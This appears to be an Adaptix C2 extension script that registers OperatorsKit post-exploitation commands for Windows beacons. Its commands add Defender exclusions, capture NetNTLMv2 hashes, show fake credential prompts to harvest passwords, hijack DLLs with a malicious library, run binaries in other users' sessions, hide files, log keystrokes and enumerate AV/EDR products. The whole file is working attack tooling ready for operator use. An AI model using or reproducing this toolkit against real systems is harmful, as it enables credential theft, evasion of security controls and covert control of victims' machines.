// OperatorsKit BOFs for Adaptix - Western Tactics
// Note: injectpoolparty excluded — requires artifact_payload (not available in AXS)
// Note: source CNA was truncated; commands after keyloggerrawinput may be missing

let cmd_addexclusion = ax.create_command(
    "addexclusion",
    "Add a Windows Defender exclusion for a path, process, or extension.",
    "addexclusion <type> <data>  (type: path|process|extension)"
);
cmd_addexclusion.addArgString("excltype", true, "Exclusion type: path | process | extension");
cmd_addexclusion.addArgString("excldata", true, "Path, process name, or extension to exclude");
cmd_addexclusion.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/AddExclusion/addexclusion.o";
    let args = ax.bof_pack("cstr,wstr", [parsed_json["excltype"], parsed_json["excldata"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_addfirewallrule = ax.create_command(
    "addfirewallrule",
    "Add a new inbound/outbound firewall rule.",
    "addfirewallrule <in|out> <port> <name> [group] [description]"
);
cmd_addfirewallrule.addArgString("direction", true, "Rule direction: in | out");
cmd_addfirewallrule.addArgString("port", true, "Port or range (e.g. 80 or 80-1000)");
cmd_addfirewallrule.addArgString("rulename", true, "Name of the firewall rule");
cmd_addfirewallrule.addArgString("rulegroup", false, "Rule group (optional)");
cmd_addfirewallrule.addArgString("description", false, "Rule description (optional)");
cmd_addfirewallrule.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/AddFirewallRule/addfirewallrule.o";
    let args = ax.bof_pack("cstr,wstr,wstr,wstr,wstr", [
        parsed_json["direction"], parsed_json["port"], parsed_json["rulename"],
        parsed_json["rulegroup"] || "", parsed_json["description"] || ""
    ]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_addlocalcert = ax.create_command(
    "addlocalcert",
    "Add a certificate to a local computer certificate store.",
    "addlocalcert <cert.cer path> <store> [friendly name]"
);
cmd_addlocalcert.addArgFile("cert_file", true, "Path to the .cer file on the operator's disk");
cmd_addlocalcert.addArgString("store", true, "Certificate store name (e.g. ROOT, MY, CA)");
cmd_addlocalcert.addArgString("friendlyname", false, "Friendly name for the certificate");
cmd_addlocalcert.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let cert_data = ax.readFile(parsed_json["cert_file"]);
    let bof_path = ax.script_dir() + "KIT/AddLocalCert/addlocalcert.o";
    let args = ax.bof_pack("bytes,wstr,cstr", [cert_data, parsed_json["store"], parsed_json["friendlyname"] || ""]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_addtaskscheduler = ax.create_command(
    "addtaskscheduler",
    "Create a scheduled task (local and remote). See help for trigger-specific optional args.",
    "addtaskscheduler <taskname> [host] <contexttype> <programpath> [programargs] <triggertype> [arg1] [arg2] [arg3] [arg4] [arg5] [arg6]"
);
cmd_addtaskscheduler.addArgString("taskname", true, "Name of the scheduled task");
cmd_addtaskscheduler.addArgString("host", false, "FQDN of remote host or empty for local");
cmd_addtaskscheduler.addArgString("contexttype", true, "User context: current|current+|creds|creds+|system");
cmd_addtaskscheduler.addArgString("programpath", true, "Path to the program to run");
cmd_addtaskscheduler.addArgString("programargs", false, "Arguments for the program");
cmd_addtaskscheduler.addArgString("triggertype", true, "Trigger: onetime|daily|logon|startup|lock|unlock");
cmd_addtaskscheduler.addArgString("arg1", false, "startTime (onetime/daily), userID (logon/lock/unlock), delay (startup)");
cmd_addtaskscheduler.addArgString("arg2", false, "repeatTask (onetime), expireTime (daily), userName (logon/startup), delay (lock/unlock)");
cmd_addtaskscheduler.addArgString("arg3", false, "userName (onetime), daysInterval int (daily), userPassword (logon/startup), userName (lock/unlock)");
cmd_addtaskscheduler.addArgString("arg4", false, "userPassword (onetime), delay (daily), userPassword (lock/unlock)");
cmd_addtaskscheduler.addArgString("arg5", false, "userName (daily)");
cmd_addtaskscheduler.addArgString("arg6", false, "userPassword (daily)");
cmd_addtaskscheduler.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let taskname    = parsed_json["taskname"];
    let host        = parsed_json["host"] || "";
    let contexttype = parsed_json["contexttype"];
    let programpath = parsed_json["programpath"];
    let programargs = parsed_json["programargs"] || "";
    let triggertype = parsed_json["triggertype"];
    let arg1 = parsed_json["arg1"] || "";
    let arg2 = parsed_json["arg2"] || "";
    let arg3 = parsed_json["arg3"] || "";
    let arg4 = parsed_json["arg4"] || "";
    let arg5 = parsed_json["arg5"] || "";
    let arg6 = parsed_json["arg6"] || "";
    let bof_path = ax.script_dir() + "KIT/AddTaskScheduler/addtaskscheduler.o";
    let args;
    if (triggertype === "daily") {
        args = ax.bof_pack("wstr,wstr,cstr,wstr,wstr,cstr,wstr,wstr,int,wstr,wstr,wstr",
            [taskname, host, contexttype, programpath, programargs, triggertype,
             arg1, arg2, parseInt(arg3) || 0, arg4, arg5, arg6]);
    } else if (triggertype === "logon" || triggertype === "startup") {
        args = ax.bof_pack("wstr,wstr,cstr,wstr,wstr,cstr,wstr,wstr,wstr",
            [taskname, host, contexttype, programpath, programargs, triggertype, arg1, arg2, arg3]);
    } else {
        args = ax.bof_pack("wstr,wstr,cstr,wstr,wstr,cstr,wstr,wstr,wstr,wstr",
            [taskname, host, contexttype, programpath, programargs, triggertype, arg1, arg2, arg3, arg4]);
    }
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_authenticatehttp = ax.create_command(
    "authenticatehttp",
    "Force a Windows-authenticated HTTP request from the current user context.",
    "authenticatehttp <host> <port>"
);
cmd_authenticatehttp.addArgString("host", true, "Hostname or localhost");
cmd_authenticatehttp.addArgInt("port", true, "Port number");
cmd_authenticatehttp.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/AuthenticateHTTP/authenticatehttp.o";
    let args = ax.bof_pack("wstr,int", [parsed_json["host"], parsed_json["port"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_capturenetntlm = ax.create_command(
    "capturenetntlm",
    "Capture the NetNTLMv2 hash of the current user via simulated NTLM exchange.",
    "capturenetntlm"
);
cmd_capturenetntlm.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/CaptureNetNTLM/capturenetntlm.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "OperatorsKit");
});

let cmd_credprompt = ax.create_command(
    "credprompt",
    "Start a persistent Windows credential prompt to capture user credentials.",
    "credprompt <title> <message> [timer]"
);
cmd_credprompt.addArgString("title", true, "Window title");
cmd_credprompt.addArgString("message", true, "Window message");
cmd_credprompt.addArgInt("timer", false, "Seconds before auto-close (default 60)");
cmd_credprompt.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/CredPrompt/credprompt.o";
    let args = ax.bof_pack("wstr,wstr,int", [
        parsed_json["title"], parsed_json["message"], parsed_json["timer"] || 60
    ]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_dcomlocalserver32 = ax.create_command(
    "dcomlocalserver32",
    "Instantiate a DCOM/COM class and start its associated EXE on a remote machine.",
    "dcomlocalserver32 <CLSID> <target>"
);
cmd_dcomlocalserver32.addArgString("clsid", true, "CLSID of the COM class (e.g. {73FDDC80-...})");
cmd_dcomlocalserver32.addArgString("target", true, "FQDN, hostname, or IP of target");
cmd_dcomlocalserver32.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/DcomLocalServer32/dcomlocalserver32.o";
    let args = ax.bof_pack("wstr,wstr", [parsed_json["clsid"], parsed_json["target"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_delexclusion = ax.create_command(
    "delexclusion",
    "Delete a Windows Defender exclusion.",
    "delexclusion <type> <data>  (type: path|process|extension)"
);
cmd_delexclusion.addArgString("excltype", true, "Exclusion type: path | process | extension");
cmd_delexclusion.addArgString("excldata", true, "Exclusion name/path to remove");
cmd_delexclusion.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/DelExclusion/delexclusion.o";
    let args = ax.bof_pack("cstr,wstr", [parsed_json["excltype"], parsed_json["excldata"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_delfirewallrule = ax.create_command(
    "delfirewallrule",
    "Delete a firewall rule by name.",
    "delfirewallrule <rule name>"
);
cmd_delfirewallrule.addArgString("rulename", true, "Name of the firewall rule to delete");
cmd_delfirewallrule.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/DelFirewallRule/delfirewallrule.o";
    let args = ax.bof_pack("wstr", [parsed_json["rulename"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_dellocalcert = ax.create_command(
    "dellocalcert",
    "Delete a local computer certificate from a store by thumbprint.",
    "dellocalcert <store> <thumbprint>"
);
cmd_dellocalcert.addArgString("store", true, "Certificate store name (e.g. ROOT)");
cmd_dellocalcert.addArgString("thumbprint", true, "Certificate thumbprint (all caps hex)");
cmd_dellocalcert.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/DelLocalCert/dellocalcert.o";
    let args = ax.bof_pack("wstr,cstr", [parsed_json["store"], parsed_json["thumbprint"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_deltaskscheduler = ax.create_command(
    "deltaskscheduler",
    "Delete a scheduled task (local and remote).",
    "deltaskscheduler <taskname> [hostname]"
);
cmd_deltaskscheduler.addArgString("taskname", true, "Name of the scheduled task to delete");
cmd_deltaskscheduler.addArgString("host", false, "FQDN of remote host or empty for local");
cmd_deltaskscheduler.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/DelTaskScheduler/deltaskscheduler.o";
    let args = ax.bof_pack("wstr,wstr", [parsed_json["taskname"], parsed_json["host"] || ""]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_dllenvhijacking = ax.create_command(
    "dllenvhijacking",
    "DLL environment hijacking via SYSTEMROOT variable manipulation.",
    "dllenvhijacking <new sysroot dir> <proxy dll name> <path to dll folder> <vulnerable binary> <parent pid>"
);
cmd_dllenvhijacking.addArgString("sysroot", true, "New SYSTEMROOT path (must end with \\)");
cmd_dllenvhijacking.addArgString("proxydll", true, "Name of the malicious DLL");
cmd_dllenvhijacking.addArgString("pathtodll", true, "Folder containing the malicious DLL (end with \\)");
cmd_dllenvhijacking.addArgString("vulnbinary", true, "Name of the vulnerable binary to execute");
cmd_dllenvhijacking.addArgInt("pid", true, "PID of parent process");
cmd_dllenvhijacking.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/DllEnvHijacking/dllenvhijacking.o";
    let args = ax.bof_pack("wstr,wstr,wstr,cstr,int", [
        parsed_json["sysroot"], parsed_json["proxydll"], parsed_json["pathtodll"],
        parsed_json["vulnbinary"], parsed_json["pid"]
    ]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumactivehosts = ax.create_command(
    "enumactivehosts",
    "Enumerate active hosts by validating open ports from a host list file.",
    "enumactivehosts <host list file> <port> [timeout ms]"
);
cmd_enumactivehosts.addArgFile("hostfile", true, "Path to newline-separated host list on operator's disk");
cmd_enumactivehosts.addArgString("port", true, "Port to validate");
cmd_enumactivehosts.addArgInt("timeout", false, "Timeout in milliseconds (default 300)");
cmd_enumactivehosts.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let file_data = ax.readFile(parsed_json["hostfile"]);
    let bof_path = ax.script_dir() + "KIT/EnumActiveHosts/enumactivehosts.o";
    let args = ax.bof_pack("bytes,cstr,int", [file_data, parsed_json["port"], parsed_json["timeout"] || 300]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumdllsideloading = ax.create_command(
    "enumdllsideloading",
    "Enumerate EXEs for DLL sideloading vulnerabilities.",
    "enumdllsideloading <path> <single|folder|recursive>"
);
cmd_enumdllsideloading.addArgString("path", true, "Path to EXE or folder to scan");
cmd_enumdllsideloading.addArgString("mode", true, "Scan mode: single | folder | recursive");
cmd_enumdllsideloading.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumDllSideloading/enumdllsideloading.o";
    let args = ax.bof_pack("cstr,cstr", [parsed_json["path"], parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumdrives = ax.create_command(
    "enumdrives",
    "Enumerate drive letters and their types.",
    "enumdrives"
);
cmd_enumdrives.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumDrives/enumdrives.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "OperatorsKit");
});

let cmd_enumexclusions = ax.create_command(
    "enumexclusions",
    "Check AV for excluded files, folders, extensions, and processes.",
    "enumexclusions"
);
cmd_enumexclusions.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumExclusions/enumexclusions.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "OperatorsKit");
});

let cmd_enumfiles = ax.create_command(
    "enumfiles",
    "Search for files by name pattern and optional content keyword.",
    "enumfiles <directory> <pattern> [keyword]"
);
cmd_enumfiles.addArgString("directory", true, "Directory to start searching from");
cmd_enumfiles.addArgString("pattern", true, "File name pattern (wildcards supported, e.g. *.xlsx)");
cmd_enumfiles.addArgString("keyword", false, "Content keyword to search in text files");
cmd_enumfiles.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumFiles/enumfiles.o";
    let args = ax.bof_pack("cstr,cstr,cstr", [
        parsed_json["directory"], parsed_json["pattern"], parsed_json["keyword"] || ""
    ]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumhandles = ax.create_command(
    "enumhandles",
    "Find process and thread handle relationships between processes.",
    "enumhandles <all|h2p|p2h> <proc|thread> [pid]"
);
cmd_enumhandles.addArgString("search", true, "Search mode: all | h2p | p2h");
cmd_enumhandles.addArgString("query", true, "Handle type: proc | thread");
cmd_enumhandles.addArgString("pid", false, "Target PID (required for h2p and p2h)");
cmd_enumhandles.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let search = parsed_json["search"];
    let query  = parsed_json["query"];
    let pid    = parsed_json["pid"] || "";
    let bof_path = ax.script_dir() + "KIT/EnumHandles/enumhandles.o";
    let args;
    if (pid !== "") {
        args = ax.bof_pack("cstr,cstr,int", [search, query, parseInt(pid)]);
    } else {
        args = ax.bof_pack("cstr,cstr", [search, query]);
    }
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumlib = ax.create_command(
    "enumlib",
    "Find a loaded module in all processes, or list all modules in a specific process.",
    "enumlib <search|list> <module name or PID>"
);
cmd_enumlib.addArgString("option", true, "Action: search (find module in all procs) | list (all modules in PID)");
cmd_enumlib.addArgString("target", true, "Module name (for search) or PID integer (for list)");
cmd_enumlib.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let option = parsed_json["option"];
    let target = parsed_json["target"];
    let bof_path = ax.script_dir() + "KIT/EnumLib/enumlib.o";
    let args;
    if (option === "list") {
        args = ax.bof_pack("cstr,int", [option, parseInt(target)]);
    } else {
        args = ax.bof_pack("cstr,cstr", [option, target]);
    }
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumlocalcert = ax.create_command(
    "enumlocalcert",
    "List all certificates in a local computer certificate store.",
    "enumlocalcert <store name>  (e.g. ROOT, MY, CA, AuthRoot)"
);
cmd_enumlocalcert.addArgString("store", true, "Certificate store name");
cmd_enumlocalcert.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumLocalCert/enumlocalcert.o";
    let args = ax.bof_pack("wstr", [parsed_json["store"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumsecproducts = ax.create_command(
    "enumsecproducts",
    "List AV/EDR security products running on the current or remote host.",
    "enumsecproducts [hostname]"
);
cmd_enumsecproducts.addArgString("hostname", false, "Remote host FQDN/IP or empty for local");
cmd_enumsecproducts.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumSecProducts/enumsecproducts.o";
    let args = ax.bof_pack("cstr", [parsed_json["hostname"] || ""]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumshares = ax.create_command(
    "enumshares",
    "List remote shares and access levels from a host list file with smart probing.",
    "enumshares <host list file> <sleep> <jitter> [timeout ms]"
);
cmd_enumshares.addArgFile("hostfile", true, "Path to newline-separated host list on operator's disk");
cmd_enumshares.addArgInt("sleep", true, "Seconds to wait between hosts");
cmd_enumshares.addArgInt("jitter", true, "Jitter percentage (0-100)");
cmd_enumshares.addArgInt("timeout", false, "Port check timeout in ms (default 300)");
cmd_enumshares.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let file_data = ax.readFile(parsed_json["hostfile"]);
    let bof_path = ax.script_dir() + "KIT/EnumShares/enumshares.o";
    let args = ax.bof_pack("bytes,int,int,int", [
        file_data, parsed_json["sleep"], parsed_json["jitter"], parsed_json["timeout"] || 300
    ]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumsysmon = ax.create_command(
    "enumsysmon",
    "Verify if Sysmon is running via registry check or Minifilter driver enumeration.",
    "enumsysmon <reg|driver>"
);
cmd_enumsysmon.addArgString("action", true, "Detection method: reg | driver (driver requires elevated privs)");
cmd_enumsysmon.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumSysmon/enumsysmon.o";
    let args = ax.bof_pack("cstr", [parsed_json["action"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumtaskscheduler = ax.create_command(
    "enumtaskscheduler",
    "Enumerate all scheduled tasks in the root folder.",
    "enumtaskscheduler [hostname]"
);
cmd_enumtaskscheduler.addArgString("host", false, "FQDN of remote host or empty for local");
cmd_enumtaskscheduler.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/EnumTaskScheduler/enumtaskscheduler.o";
    let args = ax.bof_pack("wstr", [parsed_json["host"] || ""]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_enumwebclient = ax.create_command(
    "enumwebclient",
    "Find hosts with the WebClient service running from a host list file.",
    "enumwebclient <host list file> [debug]"
);
cmd_enumwebclient.addArgFile("hostfile", true, "Path to newline-separated host list on operator's disk");
cmd_enumwebclient.addArgString("debug", false, "Pass 'debug' to include unreachable hosts in output");
cmd_enumwebclient.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let file_data = ax.readFile(parsed_json["hostfile"]);
    let bof_path = ax.script_dir() + "KIT/EnumWebClient/enumwebclient.o";
    let args = ax.bof_pack("bytes,cstr", [file_data, parsed_json["debug"] || ""]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_executecrosssession = ax.create_command(
    "executecrosssession",
    "Execute a binary on disk within another logged-on user's session via COM.",
    "executecrosssession <binary path> <session ID>"
);
cmd_executecrosssession.addArgString("binarypath", true, "Path to the binary to execute");
cmd_executecrosssession.addArgInt("sessionid", true, "Session ID of the target user");
cmd_executecrosssession.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/ExecuteCrossSession/executecrosssession.o";
    let args = ax.bof_pack("wstr,int", [parsed_json["binarypath"], parsed_json["sessionid"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_forcelockscreen = ax.create_command(
    "forcelockscreen",
    "Force the lock screen of the current user session.",
    "forcelockscreen"
);
cmd_forcelockscreen.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/ForceLockScreen/forcelockscreen.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "OperatorsKit");
});

let cmd_hidefile = ax.create_command(
    "hidefile",
    "Hide a file or directory by setting system+hidden attributes.",
    "hidefile <dir|file> <path>"
);
cmd_hidefile.addArgString("option", true, "Target type: dir | file");
cmd_hidefile.addArgString("path", true, "Path to the directory or file to hide");
cmd_hidefile.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/HideFile/hidefile.o";
    let args = ax.bof_pack("cstr,wstr", [parsed_json["option"], parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let cmd_idletime = ax.create_command(
    "idletime",
    "Check current user activity based on last input time (returns HH:MM:SS).",
    "idletime"
);
cmd_idletime.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/IdleTime/idletime.o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "OperatorsKit");
});

let cmd_keyloggerrawinput = ax.create_command(
    "keyloggerrawinput",
    "Keylogger using RegisterRawInputDevices. Run repeatedly to collect, stop to end.",
    "keyloggerrawinput <run|stop>"
);
cmd_keyloggerrawinput.addArgString("cmd", true, "Action: run (start/collect keystrokes) | stop");
cmd_keyloggerrawinput.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let bof_path = ax.script_dir() + "KIT/KeyloggerRawInput/keyloggerrawinput.o";
    let args = ax.bof_pack("cstr", [parsed_json["cmd"]]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, "OperatorsKit");
});

let group = ax.create_commands_group("operatorskit", [
    cmd_addexclusion,
    cmd_addfirewallrule,
    cmd_addlocalcert,
    cmd_addtaskscheduler,
    cmd_authenticatehttp,
    cmd_capturenetntlm,
    cmd_credprompt,
    cmd_dcomlocalserver32,
    cmd_delexclusion,
    cmd_delfirewallrule,
    cmd_dellocalcert,
    cmd_deltaskscheduler,
    cmd_dllenvhijacking,
    cmd_enumactivehosts,
    cmd_enumdllsideloading,
    cmd_enumdrives,
    cmd_enumexclusions,
    cmd_enumfiles,
    cmd_enumhandles,
    cmd_enumlib,
    cmd_enumlocalcert,
    cmd_enumsecproducts,
    cmd_enumshares,
    cmd_enumsysmon,
    cmd_enumtaskscheduler,
    cmd_enumwebclient,
    cmd_executecrosssession,
    cmd_forcelockscreen,
    cmd_hidefile,
    cmd_idletime,
    cmd_keyloggerrawinput
]);
ax.register_commands_group(group, ["beacon", "gopher", "kharon", "CrystalForge"], ["windows"], []);
